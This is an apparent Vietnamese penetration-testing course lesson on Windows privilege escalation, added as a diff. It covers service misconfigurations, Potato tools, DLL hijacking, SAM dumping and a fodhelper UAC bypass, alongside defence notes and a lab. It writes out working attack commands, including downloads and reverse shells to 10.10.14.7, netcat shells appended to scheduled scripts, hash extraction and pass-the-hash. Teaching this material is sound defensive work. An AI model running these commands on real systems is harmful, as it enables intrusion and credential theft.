@@ -1,0 +1,405 @@
+---
+title: "Leo thang đặc quyền trên Windows"
+code: "3.2"
+level: 3
+summary: "Giống bài 3.1 nhưng theo luật chơi của Windows: từ một tài khoản thường tới SYSTEM qua dịch vụ cấu hình sai, đặc quyền token bị cấp dư, và mật khẩu để lộ trong file cài đặt."
+duration: "130 phút"
+updated: "2026-11-12"
+prereq: ["1.5", "2.7"]
+objectives:
+  - "Liệt kê có hệ thống một máy Windows để tìm đường leo thang, bằng winPEAS và lệnh tay"
+  - "Nhận ra unquoted service path, quyền dịch vụ lỏng và AlwaysInstallElevated, rồi biết cách lợi dụng từng dạng"
+  - "Giải thích được vì sao SeImpersonate dẫn tới SYSTEM và tự chạy được PrintSpoofer/GodPotato"
+  - "Rút được hash tài khoản cục bộ từ SAM, dùng mật khẩu nhặt được bằng RunasCs và nhận ra khi nào bị UAC chặn"
+  - "Đề xuất được cách phòng thủ tương ứng cho từng đường leo thang"
+---
+import Callout from '../../components/ui/Callout.astro';
+import Terminal from '../../components/ui/Terminal.astro';
+import EnumExplorer from '../../components/sim/EnumExplorer.tsx';
+import ConceptMap from '../../components/sim/ConceptMap.tsx';
+import PrivescTriage from '../../components/sim/PrivescTriage.tsx';
+import Lenh from '../../components/ui/Lenh.astro';
+import LabBrief from '../../components/ui/LabBrief.astro';
+import Quiz from '../../components/sim/Quiz.tsx';
+
+## Hình dung trước
+
+Trên Windows, mỗi chương trình đang chạy (tiến trình) mang theo một "thẻ đeo" (token) ghi nó là ai và được làm gì. Leo thang là tìm cách đổi sang một thẻ đeo quyền cao hơn, thường là SYSTEM. Đây là bài song sinh của bài 3.1: cùng ý tưởng "liệt kê trước khi thử", nhưng theo luật chơi riêng của Windows, nơi khái niệm trung tâm không phải là bit quyền mà là token.
+
+## Kiến thức chính
+
+### Token và đặc quyền
+
+Khi đăng nhập, Windows tạo một token mô tả tài khoản đó và các đặc quyền (privilege) nó có. Một số đặc quyền rất mạnh: nếu một tài khoản thường (như tài khoản chạy dịch vụ web) vô tình có chúng, ví dụ `SeImpersonatePrivilege` hay `SeBackupPrivilege`, đó có thể là đường tới SYSTEM, dù tài khoản đó trông chẳng có gì đặc biệt.
+
+### Liệt kê leo thang
+
+Giống bài 3.1, đừng đoán mò. Chạy **winPEAS** để gom nhanh các kiểm tra dưới đây, nhưng hiểu từng kiểm tra trước, để biết công cụ đang nói gì khi nó tô đỏ một dòng. Bấm xem các output mẫu và tự hỏi: dòng nào là bình thường, dòng nào đáng dừng lại?
+
+<EnumExplorer
+  client:visible
+  title="Liệt kê leo thang trên một máy Windows"
+  intro="Mẫu từ một máy lab. Dòng tô vàng là manh mối."
+  prompt="C:\>"
+  items={[
+    {
+      cmd: 'whoami /priv',
+      explain: [
+        'whoami /priv: in danh sách đặc quyền (privilege) gắn với phiên đăng nhập hiện tại. "/priv" dùng dấu gạch chéo theo kiểu Windows.',
+      ],
+      output: [
+        { text: 'Privilege Name           State' },
+        { text: 'SeImpersonatePrivilege   Enabled', hit: true },
+        { text: 'SeChangeNotifyPrivilege  Enabled' },
+      ],
+      finding: 'Cột State: Enabled là đang bật. SeChangeNotifyPrivilege có ở hầu hết tài khoản, bỏ qua. SeImpersonatePrivilege Enabled đáng chú ý: đặc quyền này cho phép mạo danh một client sau xác thực — họ kỹ thuật "Potato" (PrintSpoofer, JuicyPotato) lợi dụng nó để thành SYSTEM. Rất hay gặp trên tài khoản dịch vụ web.',
+      tone: 'bad',
+    },
+    {
+      cmd: 'wmic service get name,pathname | findstr /i /v "C:\\\\Windows"',
+      explain: [
+        'wmic service get name,pathname: liệt kê tên và đường dẫn chạy của mọi dịch vụ Windows.',
+        '| findstr /i /v "C:\\\\Windows": findstr là grep của Windows. /v đảo ngược (chỉ giữ dòng KHÔNG khớp), /i không phân biệt hoa thường. Lọc bớt các dịch vụ hệ thống nằm trong C:\\Windows, chỉ còn dịch vụ của bên thứ ba.',
+      ],
+      output: [
+        { text: 'MyApp   C:\\Program Files\\My App\\service.exe' },
+        { text: 'Backup  C:\\Program Files\\Backup Svc\\run.exe', hit: true },
+      ],
+      finding: 'Đọc kỹ từng đường dẫn. "C:\\Program Files\\Backup Svc\\run.exe" có dấu cách mà không đặt trong ngoặc kép. Windows có thể thử chạy "C:\\Program.exe" hoặc "C:\\Program Files\\Backup.exe" trước — nếu bạn ghi được file vào đó, dịch vụ (quyền SYSTEM) chạy file của bạn. Dòng MyApp không có khoảng trống đáng ngờ, bỏ qua.',
+      tone: 'bad',
+    },
+    {
+      cmd: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
+      explain: [
+        'reg query KHOÁ /v TÊN: đọc một giá trị cụ thể (/v) trong registry. HKLM là cấu hình áp cho cả máy.',
+        'AlwaysInstallElevated: tên thiết lập cần kiểm tra, nằm dưới chính sách cài đặt (Installer policy).',
+      ],
+      output: [
+        { text: '    AlwaysInstallElevated    REG_DWORD    0x1', hit: true },
+      ],
+      finding: 'REG_DWORD là kiểu số; giá trị 0x1 (tức 1) nghĩa là BẬT. AlwaysInstallElevated = 1 (và cả bản dưới HKCU, kiểm tra thêm bằng lệnh tương tự) nghĩa là mọi gói .msi được cài với quyền SYSTEM. Đóng một .msi chứa payload của mình rồi cài là lên SYSTEM. Giá trị 0 hoặc không tồn tại khoá này nghĩa là an toàn ở điểm này.',
+      tone: 'bad',
+    },
+    {
+      cmd: 'dir /s *vnc.ini *unattend.xml *.kdbx 2>nul',
+      explain: [
+        'dir /s: tìm file, /s nghĩa là tìm cả trong thư mục con.',
+        '*vnc.ini *unattend.xml *.kdbx: ba kiểu tên file hay chứa mật khẩu (cấu hình VNC, file cài tự động, kho mật khẩu KeePass).',
+        '2>nul: vứt thông báo lỗi "Access is denied" đi (tương đương 2>/dev/null trên Linux).',
+      ],
+      output: [
+        { text: 'C:\\Windows\\Panther\\unattend.xml', hit: true },
+      ],
+      finding: 'Tìm thấy file cài đặt tự động unattend.xml thường chứa mật khẩu quản trị (đôi khi mã hoá base64 yếu, đọc được bằng certutil -decode). Nơi kinh điển để tìm thông tin đăng nhập. Không tìm thấy gì cũng bình thường, thử các vị trí lộ thông tin khác.',
+      tone: 'warn',
+    },
+  ]}
+/>
+
+### Sàng lọc manh mối trước khi thử
+
+Cũng giống như trên Linux, kết quả quét của `winPEAS` trên Windows thường báo động ở rất nhiều mục — từ đường dẫn có khoảng trắng cho tới các khóa Registry hay file cấu hình cũ. Nhưng muốn biết hướng nào thật sự leo thang được, bạn phải nhìn kèm điều kiện quyền hạn cụ thể. Hãy thử chọn ra những manh mối đáng đào sâu trước trong bảng dưới đây:
+
+<PrivescTriage client:visible platform="windows" />
+
+### Đường từ người dùng thường tới SYSTEM
+
+<ConceptMap
+  client:visible
+  title="Các đường leo thang trên Windows"
+  width={640}
+  height={300}
+  nodes={[
+    { id: 'user', label: 'Người dùng thường', x: 120, y: 150, detail: 'Token quyền thấp. Điểm khởi đầu sau khi vào máy, ví dụ tài khoản dịch vụ web.' },
+    { id: 'svc', label: 'Dịch vụ cấu hình sai', x: 340, y: 70, tone: 'warn', detail: 'Unquoted path, quyền sửa dịch vụ lỏng, hoặc file ghi được. Dịch vụ chạy SYSTEM.' },
+    { id: 'priv', label: 'Đặc quyền token', x: 340, y: 150, tone: 'warn', detail: 'SeImpersonate (họ Potato), SeBackup, SeRestore... lạm dụng để đọc file hoặc thành SYSTEM.' },
+    { id: 'cred', label: 'Thông tin để lộ', x: 340, y: 230, tone: 'warn', detail: 'unattend.xml, registry, file cấu hình phần mềm. Có thể là mật khẩu admin.' },
+    { id: 'system', label: 'SYSTEM', x: 550, y: 150, tone: 'accent', detail: 'Quyền cao nhất. Từ đây đọc mọi dữ liệu và chuẩn bị lan sang máy khác (bài 3.3, 3.4).' },
+  ]}
+  edges={[
+    { from: 'user', to: 'svc' },
+    { from: 'user', to: 'priv' },
+    { from: 'user', to: 'cred' },
+    { from: 'svc', to: 'system' },
+    { from: 'priv', to: 'system' },
+    { from: 'cred', to: 'system' },
+  ]}
+/>
+
+<Callout type="note">
+Với SeImpersonate, công cụ như <code>PrintSpoofer</code> biến đặc quyền đó thành shell SYSTEM bằng một lệnh. Ở cấp này cần nhớ: thấy SeImpersonate Enabled trên tài khoản dịch vụ là một tín hiệu leo thang mạnh.
+</Callout>
+
+Mỗi manh mối ở trên dẫn tới một cách lạm dụng riêng: một dịch vụ cấu hình sai thì **thay file mà dịch vụ chạy** rồi khởi động lại dịch vụ; một tác vụ lịch chạy bằng quyền cao mà script của nó ghi được thì **sửa script**; `AlwaysInstallElevated` thì **cài một gói .msi do mình đóng**. Mỗi đường đều kết thúc ở việc một tiến trình quyền SYSTEM chạy thứ do bạn đặt ra.
+
+Phần quan trọng để nhớ không phải lệnh cụ thể, mà là: **mọi đường leo thang Windows đều để lại một dấu vết có thể giám sát**.
+
+<Callout type="defense" label="Phát hiện leo thang Windows">
+Khi một dịch vụ bị dựng hoặc sửa, Windows ghi <strong>sự kiện 7045</strong> (dịch vụ mới) hoặc 7040 (dịch vụ đổi cấu hình). Tạo hoặc sửa tác vụ lịch ghi <strong>4698/4702</strong>. Một tiến trình con bất thường sinh ra từ dịch vụ, hoặc một <code>.msi</code> cài ngoài giờ, đều là tín hiệu. Bật ghi log tạo tiến trình (4688) kèm dòng lệnh và đẩy về SOC (bài 8.1) là cách thấy các bước này.
+</Callout>
+
+### Thực hành: từ một manh mối dịch vụ tới SYSTEM
+
+Sơ đồ cho biết *đi hướng nào*; phần này cho biết *gõ gì*. Lấy đường hay gặp nhất: một dịch vụ chạy SYSTEM mà bạn có quyền sửa. Hai lệnh đầu để **xác nhận có quyền trước khi động tay** (đừng phá một dịch vụ mà bạn không đổi lại được).
+
+<Lenh noi="Command Prompt trên máy nạn nhân, đang là tài khoản thường" muc="Kiểm tra quyền trên một dịch vụ, rồi trỏ nó sang lệnh của mình và khởi động lại để chạy bằng SYSTEM" quyen="Cần quyền sửa cấu hình (SERVICE_CHANGE_CONFIG) hoặc khởi động/dừng dịch vụ — hai lệnh đầu xác nhận điều đó">
+
+<Terminal title="Lạm dụng một dịch vụ cấu hình lỏng">
+
+```text
+C:\> sc qc BackupSvc
+        BINARY_PATH_NAME   : C:\Program Files\Backup Svc\run.exe
+        SERVICE_START_NAME : LocalSystem
+
+C:\> icacls "C:\Program Files\Backup Svc\run.exe"
+    run.exe  BUILTIN\Users:(F)
+
+C:\> sc config BackupSvc binpath= "C:\Windows\Temp\rev.exe"
+[SC] ChangeServiceConfig SUCCESS
+
+C:\> sc stop BackupSvc & sc start BackupSvc
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `sc qc BackupSvc`: hỏi cấu hình (query config) của dịch vụ. Cần nhìn hai dòng: file nó chạy, và `SERVICE_START_NAME : LocalSystem` nghĩa là nó chạy bằng SYSTEM.
+- `icacls "...run.exe"`: in quyền trên file. `BUILTIN\Users:(F)` nghĩa là *mọi người dùng có toàn quyền (Full)* trên file của dịch vụ — bạn ghi đè được file đó.
+- `sc config ... binpath=`: đổi file dịch vụ sẽ chạy sang một chương trình của bạn (ví dụ reverse shell dựng bằng `msfvenom`, bài 3.7). Dấu cách sau `binpath=` là bắt buộc.
+- `sc stop ... & sc start ...`: dừng rồi khởi động lại; lúc khởi động, dịch vụ chạy file của bạn bằng SYSTEM.
+
+</div>
+
+<div slot="doc">
+
+- Nếu `icacls` cho thấy chỉ sửa được *cấu hình* chứ không ghi được *file* (`SERVICE_CHANGE_CONFIG` nhưng file do admin sở hữu), vẫn khai thác được bằng `sc config binpath=` như trên — đổi thẳng đường dẫn, khỏi cần ghi đè file.
+- Với **unquoted service path** (đường dẫn có dấu cách không ngoặc, như manh mối lúc liệt kê), thay vì đổi cấu hình bạn đặt một file đúng tên vào chỗ Windows chạy nhầm, ví dụ `C:\Program.exe`.
+- Luôn ghi lại cấu hình gốc trước khi đổi để trả lại sau — cả trong lab lẫn dự án thật.
+
+</div>
+
+</Lenh>
+
+### Thực hành: SeImpersonate tới SYSTEM (họ Potato)
+
+Đây là đường leo thang hay gặp nhất khi đường vào là một lỗi web trên IIS hoặc một `xp_cmdshell` của SQL Server, vì tài khoản dịch vụ của hai thứ đó gần như luôn có `SeImpersonatePrivilege`.
+
+Cơ chế chung của cả họ: công cụ dựng một dịch vụ giả rồi **dụ một tiến trình SYSTEM kết nối vào**; nhờ SeImpersonate, nó được phép "mượn" token của bên vừa kết nối, tức token SYSTEM, và dùng token đó để chạy lệnh của bạn.
+
+<Lenh noi="Command Prompt trên máy nạn nhân, đang là tài khoản dịch vụ (ví dụ iis apppool\defaultapppool)" muc="Xác nhận có SeImpersonate, tải công cụ lên rồi đổi nó thành một lệnh chạy bằng SYSTEM" quyen="Cần SeImpersonatePrivilege (hoặc SeAssignPrimaryToken) ở trạng thái Enabled">
+
+<Terminal title="PrintSpoofer và GodPotato">
+
+```text
+C:\Windows\Temp> whoami /priv | findstr Impersonate
+SeImpersonatePrivilege   Impersonate a client after authentication   Enabled
+
+C:\Windows\Temp> certutil -urlcache -f http://10.10.14.7/PrintSpoofer64.exe ps.exe
+
+C:\Windows\Temp> ps.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+C:\Windows\system32> whoami
+nt authority\system
+
+--- nếu PrintSpoofer không chạy (máy đã vá hoặc tắt dịch vụ Spooler) ---
+C:\Windows\Temp> GodPotato-NET4.exe -cmd "cmd /c whoami"
+nt authority\system
+C:\Windows\Temp> GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe 10.10.14.7 443 -e cmd.exe"
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `certutil -urlcache -f URL tên-file`: tải file từ máy chủ HTTP trên Kali về máy nạn nhân (bài 2.7).
+- `ps.exe -i -c cmd`: `-c cmd` là lệnh cần chạy bằng SYSTEM; `-i` chạy nó ngay trong cửa sổ hiện tại. `-i` chỉ dùng được khi shell của bạn là shell tương tác.
+- `GodPotato -cmd "..."`: chạy một lệnh bằng SYSTEM. Lệnh thứ hai gọi `nc.exe` (đã tải lên trước) để mở một reverse shell SYSTEM về cổng 443 của Kali, nơi bạn đã chờ sẵn bằng `nc -lvnp 443`.
+
+</div>
+
+<div slot="doc">
+
+- `nt authority\system` sau `whoami` là xong: đọc `proof.txt` và chụp bằng chứng ngay trong shell này (bài 4.2).
+- Mỗi công cụ trong họ dựa vào một thành phần Windows khác nhau, nên cái này hỏng thì thử cái kia: **PrintSpoofer** (Windows 10, Server 2016/2019, cần dịch vụ Print Spooler), **GodPotato** (Server 2012 tới 2022, Windows 8 tới 11), **JuicyPotato** (máy cũ trước Server 2019). Tải sẵn cả ba về Kali trước ngày thi.
+- Shell không tương tác (web shell, `xp_cmdshell`) thì bỏ `-i`, cho công cụ chạy thẳng một reverse shell như dòng cuối.
+- Các công cụ này bị Defender nhận diện theo chữ ký; trong lab thường tắt, trên hệ thống thật chúng bị chặn và báo động ngay (bài 3.8).
+
+</div>
+
+</Lenh>
+
+### Ba dạng "một tiến trình quyền cao chạy file của mình"
+
+Ba dạng dưới đây chung một ý với dịch vụ cấu hình lỏng ở trên: tìm một thứ **chạy bằng quyền cao** mà **bạn ghi được vào chỗ nó sẽ đọc**. Khác nhau ở chỗ ghi vào đâu.
+
+**Unquoted service path.** Dịch vụ có đường dẫn `C:\Program Files\Backup Svc\run.exe` không đặt trong ngoặc kép. Khi khởi động, Windows thử lần lượt `C:\Program.exe`, rồi `C:\Program Files\Backup.exe`, rồi mới tới file thật. Bạn cần quyền ghi vào **một** trong các thư mục đứng trước đó, nên kiểm tra từng thư mục từ gốc đi xuống:
+
+```text
+C:\> icacls "C:\"
+     BUILTIN\Users:(OI)(CI)(RX)        ← chỉ đọc: không đặt được C:\Program.exe
+C:\> icacls "C:\Program Files"
+     BUILTIN\Users:(OI)(CI)(W)         ← (W) ghi được: đặt được C:\Program Files\Backup.exe
+C:\> copy C:\Windows\Temp\rev.exe "C:\Program Files\Backup.exe"
+C:\> sc stop BackupSvc & sc start BackupSvc
+```
+
+Bẫy hay gặp: winPEAS tô đỏ mọi đường dẫn không ngoặc, nhưng **không ghi được thư mục nào thì không có gì để khai thác**. Trên Windows mặc định, người dùng thường không ghi được `C:\` lẫn `C:\Program Files`; lỗi này chỉ sống khi quản trị viên nới quyền hoặc cài phần mềm ở một thư mục riêng như `C:\Apps\My Tool\`.
+
+Nếu bạn không có quyền dừng dịch vụ mà dịch vụ đặt chế độ tự chạy (`START_TYPE : AUTO_START`), khởi động lại máy bằng `shutdown /r /t 0` (cần `SeShutdownPrivilege`).
+
+**Tác vụ lịch.** Tìm tác vụ chạy bằng tài khoản quyền cao và trỏ tới file bạn sửa được:
+
+```text
+C:\> schtasks /query /fo LIST /v | findstr /i "TaskName Run.As Task.To.Run"
+TaskName:      \Backup\NightlySync
+Task To Run:   C:\Scripts\sync.bat
+Run As User:   SYSTEM
+C:\> icacls C:\Scripts\sync.bat
+     BUILTIN\Users:(M)                 ← (M) = Modify: sửa được
+C:\> echo C:\Windows\Temp\nc.exe 10.10.14.7 443 -e cmd.exe >> C:\Scripts\sync.bat
+```
+
+Rồi mở sẵn `nc -lvnp 443` trên Kali và **chờ tới lần chạy kế** (dòng `Next Run Time` cho biết khi nào). Dùng `>>` để nối thêm chứ không ghi đè, giữ nguyên việc tác vụ vẫn làm.
+
+**DLL hijacking.** Một chương trình quyền cao nạp thư viện theo *tên* chứ không theo đường dẫn đầy đủ. Windows tìm DLL theo thứ tự: thư mục của chương trình trước, rồi `System32`, rồi các thư mục trong `PATH`. Nếu DLL đó **không tồn tại** ở chỗ nào đứng trước, và bạn ghi được vào thư mục chương trình (hoặc một thư mục trong `PATH`), bạn đặt DLL của mình vào:
+
+```text
+kali@lab:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 -f dll -o missing.dll
+```
+
+Tên DLL bị thiếu thường lộ ra qua tài liệu của ứng dụng, qua winPEAS, hoặc bằng cách sao chép chương trình về một máy Windows của bạn rồi xem bằng Process Monitor (lọc kết quả `NAME NOT FOUND`). Sau khi đặt file, khởi động lại dịch vụ để nó nạp DLL.
+
+### Khi mật khẩu không nằm trong file: SAM, runas và UAC
+
+<Lenh noi="Command Prompt trên máy nạn nhân; lệnh impacket chạy trên Kali" muc="Sao chép hai hive registry chứa hash tài khoản cục bộ, rồi tách hash ra trên Kali" quyen="Cần SeBackupPrivilege, thuộc nhóm Backup Operators, hoặc đã là quản trị viên cục bộ">
+
+<Terminal title="Rút hash tài khoản cục bộ từ SAM">
+
+```text
+C:\> reg save HKLM\SAM C:\Windows\Temp\sam.save
+C:\> reg save HKLM\SYSTEM C:\Windows\Temp\system.save
+The operation completed successfully.
+
+kali@lab:~$ impacket-secretsdump -sam sam.save -system system.save LOCAL
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `reg save HKLM\SAM tên-file`: xuất hive `SAM` (nơi lưu hash mật khẩu tài khoản cục bộ) ra file. `HKLM\SYSTEM` chứa khoá dùng để giải mã `SAM`, nên phải lấy cả hai.
+- Chuyển hai file về Kali (bài 2.7), rồi `impacket-secretsdump ... LOCAL` đọc chúng ngoại tuyến, không chạm vào máy đích nữa.
+
+</div>
+
+<div slot="doc">
+
+- Mỗi dòng có dạng `tên:RID:hash LM:hash NT`. Phần sau cùng (`2b57...`) là hash NT: đem bẻ bằng hashcat chế độ `-m 1000` (bài 2.6), hoặc dùng thẳng để đăng nhập bằng Pass-the-Hash (bài 3.5): `evil-winrm -i 10.10.14.30 -u Administrator -H 2b576acb...`.
+- Cũng nên tìm bản sao lưu có sẵn: `C:\Windows\Repair\`, `C:\Windows\System32\config\RegBack\`, hoặc file `SAM`/`SYSTEM` nằm trong một share sao lưu. Đọc được chúng thì khỏi cần đặc quyền nào.
+
+</div>
+
+</Lenh>
+
+**Có mật khẩu nhưng không có đường đăng nhập.** Bạn nhặt được mật khẩu của một tài khoản khác, mà máy không mở RDP hay WinRM. `runas /user:tên cmd` đòi gõ mật khẩu trong một phiên tương tác, thứ mà reverse shell không có. Hai cách thay thế:
+
+- **RunasCs** (tải lên máy đích): `RunasCs.exe svc_admin "P@ssw0rd!" cmd.exe -r 10.10.14.7:443` chạy `cmd` bằng tài khoản kia và gửi thẳng một reverse shell về Kali.
+- **PowerShell**, không cần tải gì: tạo đối tượng thông tin đăng nhập rồi gọi `Start-Process`:
+
+```text
+PS> $p = ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force
+PS> $c = New-Object System.Management.Automation.PSCredential('svc_admin', $p)
+PS> Start-Process C:\Windows\Temp\rev.exe -Credential $c
+```
+
+Ngoài ra hãy chạy `cmdkey /list`: nếu có thông tin đăng nhập đã lưu, `runas /savecred /user:tên "C:\Windows\Temp\rev.exe"` dùng được nó mà không cần biết mật khẩu.
+
+**Đã thuộc nhóm Administrators mà vẫn bị từ chối: UAC.** Nếu `whoami /groups` có `BUILTIN\Administrators` nhưng dòng cuối ghi `Mandatory Label\Medium Mandatory Level`, shell của bạn đang chạy bằng nửa "thường" của token. UAC giữ nửa quyền cao lại cho tới khi có người bấm đồng ý trên màn hình. Cách qua, theo thứ tự nên thử:
+
+1. Đăng nhập lại qua một đường **không bị UAC lọc**: RDP (rồi bấm "Run as administrator"), hoặc với tài khoản domain thuộc nhóm quản trị thì dùng `evil-winrm`/`impacket-psexec` từ Kali (bài 3.9).
+2. Dùng một kỹ thuật vượt UAC: vài chương trình có sẵn của Windows (như `fodhelper.exe`) tự chạy ở mức cao mà không hỏi, và đọc lệnh cần chạy từ một khoá registry mà người dùng thường ghi được. Ghi lệnh của mình vào khoá đó rồi gọi chương trình:
+
+```text
+C:\> reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
+C:\> reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\Temp\rev.exe" /f
+C:\> fodhelper.exe
+```
+
+Shell mới sẽ có `High Mandatory Level`. Xong việc, xoá khoá vừa tạo (`reg delete HKCU\Software\Classes\ms-settings /f`). Vượt UAC **không** phải là leo quyền từ người dùng thường: nó chỉ áp dụng khi tài khoản đã thuộc nhóm Administrators.
+
+<Callout type="note" label="Mật khẩu để lộ: hai chỗ hay quên">
+Ngoài <code>unattend.xml</code>, hai nơi hay có mật khẩu: <strong>lịch sử PowerShell</strong> (<code>type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code>) thường lưu lại nguyên lệnh ai đó gõ kèm mật khẩu; và <strong>kho KeePass</strong> (file <code>.kdbx</code> tìm thấy lúc liệt kê) — nếu lấy được file, có thể bẻ mật khẩu chính offline bằng <code>keepass2john</code> rồi hashcat (bài 2.6).
+</Callout>
+
+<LabBrief
+  ten="Tự dựng một dịch vụ cấu hình sai, rồi tự leo quyền qua nó"
+  muctieu="Vì không có sẵn máy Windows cố tình để lỗi như Metasploitable, bạn đóng cả hai vai: trước tiên dựng một dịch vụ lỏng quyền đúng như ví dụ trong bài, sau đó đóng vai kẻ tấn công để chiếm SYSTEM qua chính nó"
+  may="Windows bản đánh giá (bài 0.2), đăng nhập bằng một tài khoản quản trị để dựng, rồi hạ quyền xuống tài khoản thường để tấn công"
+  thoigian="45 phút"
+  xong="Từ một tài khoản thường (không phải Administrators), bạn chạy whoami ra nt authority\\system, và giải thích đúng quyền nào trên file hay cấu hình dịch vụ đã cho phép điều đó"
+>
+
+1. Bằng tài khoản quản trị, tạo một dịch vụ Windows mới trỏ tới một file `.exe` bất kỳ (`sc create ...`), rồi cố ý cấp quyền ghi cho nhóm Users lên file đó bằng `icacls`.
+2. Tạo một tài khoản Windows thường, không thêm vào nhóm Administrators.
+3. Đăng xuất, đăng nhập lại bằng tài khoản thường, xác nhận bằng `whoami /groups` rằng mình không có quyền quản trị.
+4. Dùng đúng kỹ thuật "dịch vụ cấu hình sai" ở phần Thực hành của bài này để biến dịch vụ đó thành SYSTEM.
+5. Dọn dẹp: xoá dịch vụ và tài khoản thử nghiệm.
+
+<div slot="goiy1">
+Bước 1 chính là tạo ra ngược lại tình huống `BackupSvc` mà bài đã minh hoạ: dùng `sc create TenDV binPath= "C:\Windows\Temp\run.exe" start= demand`, rồi `icacls C:\Windows\Temp\run.exe /grant Users:F`.
+</div>
+
+<div slot="goiy2">
+Ở bước 4, làm lại đúng ba lệnh trong khối "Lạm dụng một dịch vụ cấu hình lỏng": `sc qc`, `icacls`, `sc config ... binpath=`, rồi `sc stop`/`sc start`.
+</div>
+
+<div slot="kiemtra">
+
+- Đúng: sau khi khởi động lại dịch vụ, shell mới mở ra chạy bằng `nt authority\system`.
+- `sc config` báo lỗi "Access is denied": bạn đang chạy từ tài khoản thường và chưa thực sự có quyền `SERVICE_CHANGE_CONFIG` — kiểm tra lại quyền đã cấp ở bước 1, có thể bạn cấp nhầm cho chính mình (tài khoản quản trị) thay vì nhóm Users.
+- Dịch vụ không khởi động lại được: `start= demand` nghĩa là chỉ chạy khi bạn gọi `sc start` thủ công, đó là bình thường cho bài tập này.
+
+</div>
+
+</LabBrief>
+
+## Góc phòng thủ
+
+<Callout type="defense">
+Mỗi manh mối ở phần liệt kê trên ứng với một việc cụ thể cần sửa. Luôn đặt đường dẫn dịch vụ trong ngoặc kép; đặt quyền chặt trên cấu hình và file của dịch vụ (đừng để nhóm Users có quyền ghi); không chạy dịch vụ bằng quyền cao hơn cần; không bật AlwaysInstallElevated; đặt script của tác vụ lịch ở nơi chỉ admin ghi được; xoá mật khẩu khỏi unattend.xml và khỏi lịch sử PowerShell sau khi cài xong máy; hạn chế cấp SeImpersonate và SeBackup cho tài khoản không thật sự cần.
+
+Cập nhật Windows đều, vì nhiều kỹ thuật "Potato" bị vá dần qua các bản cập nhật. Giới hạn nhóm Backup Operators và theo dõi lệnh <code>reg save</code> nhắm vào <code>HKLM\SAM</code>; đặt UAC ở mức "Always notify" và không để người dùng làm việc hằng ngày bằng tài khoản quản trị. Chính winPEAS cũng là công cụ đội phòng thủ dùng để tự tìm các sơ hở này trước khi kẻ tấn công tìm thấy.
+</Callout>
+
+## Lỗi người mới hay gặp
+
+- **Chỉ nghĩ tới mã khai thác nhân Windows.** Giống lỗi ở bài 3.1, người mới thích hướng "cao siêu" trong khi cấu hình dịch vụ sai lại phổ biến và dễ khai thác hơn nhiều.
+- **Không đọc `whoami /priv`.** Đây là nơi lộ SeImpersonate và các đặc quyền khác ngay từ dòng đầu tiên, nhưng người mới hay bỏ qua vì tên nghe lạ và không biết chúng nguy hiểm.
+- **Bỏ qua registry và unattend.xml.** Hai nơi này không "ngầu" như khai thác đặc quyền, nhưng lại hay lộ mật khẩu quản trị nhanh nhất, đôi khi chỉ là đọc một file.
+
+## Kiểm tra nhanh
+
+<Quiz
+  client:visible
+  questions={[
+    { q: 'SeImpersonatePrivilege Enabled trên một tài khoản dịch vụ gợi ý điều gì?', options: ['Không có gì', 'Có thể leo thang lên SYSTEM bằng kỹ thuật họ Potato', 'Tài khoản bị khoá'], answer: 1, explain: 'Đặc quyền mạo danh này bị PrintSpoofer/JuicyPotato lợi dụng để thành SYSTEM.' },
+    { q: 'Vì sao "unquoted service path" nguy hiểm?', options: ['Trông xấu', 'Windows có thể chạy nhầm một file khác do kẻ tấn công đặt vào', 'Làm chậm máy'], answer: 1, explain: 'Dấu cách trong đường dẫn không ngoặc có thể khiến Windows chạy nhầm chương trình.' },
+    { q: 'winPEAS tô đỏ một dịch vụ có đường dẫn không ngoặc kép. Cần kiểm tra gì trước khi coi đó là đường leo thang?', options: ['Không cần kiểm tra gì thêm', 'Mình có ghi được vào một thư mục đứng trước trên đường dẫn và khởi động lại được dịch vụ không', 'Dịch vụ có tên tiếng Anh không'], answer: 1, explain: 'Không ghi được thư mục nào thì Windows không có file nào để chạy nhầm; icacls từng thư mục là bước bắt buộc.' },
+    { q: 'PrintSpoofer báo lỗi trên một máy Server 2022 dù có SeImpersonate. Nước đi hợp lý tiếp theo?', options: ['Bỏ hướng này', 'Thử một công cụ khác trong họ, ví dụ GodPotato', 'Khởi động lại máy'], answer: 1, explain: 'Mỗi công cụ Potato dựa vào một thành phần Windows khác nhau; đặc quyền còn đó thì vẫn còn đường.' },
+    { q: 'whoami /groups cho thấy bạn thuộc Administrators nhưng ở Medium Mandatory Level. Điều gì đang chặn bạn?', options: ['Tường lửa', 'UAC: shell đang dùng nửa quyền thường của token', 'Mật khẩu sai'], answer: 1, explain: 'Cần đăng nhập qua đường không bị lọc hoặc dùng một kỹ thuật vượt UAC để có High Mandatory Level.' },
+    { q: 'AlwaysInstallElevated = 1 cho phép điều gì?', options: ['Cài mọi .msi với quyền SYSTEM', 'Tắt Windows Update', 'Xoá người dùng'], answer: 0, explain: 'Mọi gói .msi được cài với quyền cao, nên một .msi payload sẽ chạy bằng SYSTEM.' },
+    { q: 'File unattend.xml thường chứa gì đáng giá?', options: ['Ảnh nền', 'Mật khẩu quản trị dùng khi cài tự động', 'Nhật ký web'], answer: 1, explain: 'Cấu hình cài đặt tự động hay nhúng mật khẩu admin, đôi khi chỉ mã hoá base64 yếu.' },
+  ]}
+/>
+
+## Ghi nhớ
+
+- Liệt kê trước khi thử: `whoami /priv`, dịch vụ (unquoted path, quyền lỏng), registry (AlwaysInstallElevated), file cấu hình. Cùng tinh thần với bài 3.1, chỉ khác công cụ.
+- Ba họ đường đi đều dẫn tới SYSTEM: dịch vụ cấu hình sai, đặc quyền token bị cấp dư (họ Potato), và mật khẩu để lộ trong file cấu hình.
